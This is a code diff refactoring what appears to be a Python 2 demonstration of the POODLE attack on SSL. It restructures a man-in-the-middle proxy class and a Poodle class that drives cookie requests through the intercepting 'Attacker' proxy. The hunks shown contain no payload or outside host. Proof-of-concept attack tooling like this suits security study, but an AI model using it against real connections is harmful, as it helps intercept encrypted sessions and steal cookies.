@@ -135,10 +135,9 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
                     socket_server.send(data)
         return
 
-class Proxy(Client):
+class Proxy:
 
-    def __init__(self, client, host, port):
-        self.client = client
+    def __init__(self, host, port):
         self.host = host
         self.port = port
 
@@ -157,28 +156,31 @@ class Proxy(Client):
         self.proxy.shutdown()
         return
 
+class Poodle(Client):
+
+    def __init__(self, client):
+        self.client = client
+
+    def test_poodle_attack(self):
+        self.client_connection()
+        self.send_request_from_the_client()
+        self.send_request_from_the_client(2, 1)
+        self.client_disconect()
+        return
+
     def client_connection(self):
-        print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.BOLD + "[proxy]" + pyfancy.END
+        print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.RED + "Attacker" + pyfancy.END
         self.client.connection()
         return
 
     def send_request_from_the_client(self, path=0, data=0):
-        print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.BOLD + "[proxy]" + pyfancy.END
+        print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.RED + "Attacker" + pyfancy.END
         self.client.request_cookie(path,data)
         return
 
     def client_disconect(self):
-        print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.BOLD + "[proxy]" + pyfancy.END
+        print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.RED + "Attacker" + pyfancy.END
         self.client.disconnect()
-        return
-
-class Poodle:
-
-    def test_poodle_attack(self):
-        spy.client_connection()
-        spy.send_request_from_the_client()
-        spy.send_request_from_the_client(2, 1)
-        spy.client_disconect()
         return
 
 if __name__ == '__main__':
@@ -191,8 +193,8 @@ if __name__ == '__main__':
 
     server  = Server(args.host, args.port)
     client  = Client(args.host, args.port+1)
-    spy     = Proxy(client, args.host, args.port+1)
-    poodle  = Poodle()
+    spy     = Proxy(args.host, args.port+1)
+    poodle  = Poodle(client)
 
     server.connection()
     spy.connection()
